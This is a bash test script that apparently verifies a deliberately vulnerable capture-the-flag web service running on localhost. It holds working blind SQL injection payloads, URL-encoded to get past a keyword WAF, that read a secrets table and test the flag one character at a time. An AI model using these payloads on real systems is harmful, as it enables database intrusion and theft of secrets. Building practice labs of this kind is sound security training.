#!/bin/bash

# Basic test script using only curl (no Python dependencies needed)

set -e

BASE_URL="${1:-http://localhost:5050}"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "======================================"
echo "  Basic Service Verification"
echo "======================================"
echo "Target: $BASE_URL"
echo ""

# Test 1: Health check
echo -e "${BLUE}[1/6]${NC} Health check..."
RESPONSE=$(curl -s "$BASE_URL/health")
if [ "$RESPONSE" = "OK" ]; then
    echo -e "${GREEN}✓${NC} Health check passed"
else
    echo -e "${RED}✗${NC} Health check failed"
    exit 1
fi

# Test 2: Normal search
echo -e "${BLUE}[2/6]${NC} Normal search (id=1)..."
RESPONSE=$(curl -s "$BASE_URL/search?id=1")
if echo "$RESPONSE" | grep -q "User Found"; then
    echo -e "${GREEN}✓${NC} Normal search works"
else
    echo -e "${RED}✗${NC} Normal search failed"
    exit 1
fi

# Test 3: WAF blocks OR
echo -e "${BLUE}[3/6]${NC} WAF blocks OR keyword..."
RESPONSE=$(curl -s "$BASE_URL/search?id=1%20OR%201=1")
if echo "$RESPONSE" | grep -q "Malicious input detected"; then
    echo -e "${GREEN}✓${NC} WAF blocks OR"
else
    echo -e "${RED}✗${NC} WAF should block OR"
    exit 1
fi

# Test 4: URL encoding bypass
echo -e "${BLUE}[4/6]${NC} URL encoding bypasses WAF..."
# "1 AND 1=1" fully encoded
RESPONSE=$(curl -s "$BASE_URL/search?id=1%20%41%4e%44%20%31%3d%31")
if echo "$RESPONSE" | grep -q "User Found"; then
    echo -e "${GREEN}✓${NC} URL encoding bypass works"
else
    echo -e "${RED}✗${NC} URL encoding bypass failed"
    exit 1
fi

# Test 5: Secrets table access
echo -e "${BLUE}[5/6]${NC} Access secrets table..."
# "1 AND (select 1 from secrets)=1"
RESPONSE=$(curl -s "$BASE_URL/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%29%3d%31")
if echo "$RESPONSE" | grep -q "User Found"; then
    echo -e "${GREEN}✓${NC} Secrets table accessible"
else
    echo -e "${RED}✗${NC} Cannot access secrets table"
    exit 1
fi

# Test 6: Flag extraction test
echo -e "${BLUE}[6/6]${NC} Flag extraction (first char='c')..."
# "1 AND (select 1 from secrets where substr(secret_value,1,1)='c')=1"
RESPONSE=$(curl -s "$BASE_URL/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%77%68%65%72%65%20%73%75%62%73%74%72%28%73%65%63%72%65%74%5f%76%61%6c%75%65%2c%31%2c%31%29%3d%27%63%27%29%3d%31")
if echo "$RESPONSE" | grep -q "User Found"; then
    echo -e "${GREEN}✓${NC} Flag extraction works"
else
    echo -e "${RED}✗${NC} Flag extraction failed"
    exit 1
fi

echo ""
echo "======================================"
echo -e "${GREEN}✓ ALL TESTS PASSED!${NC}"
echo "======================================"
echo ""
echo "Service is ready for CTF!"
echo ""
echo "Next steps:"
echo "  - Install Python requests: pip3 install requests"
echo "  - Run verification: python3 verify.py"
echo "  - Run full exploit: python3 exploit.py"
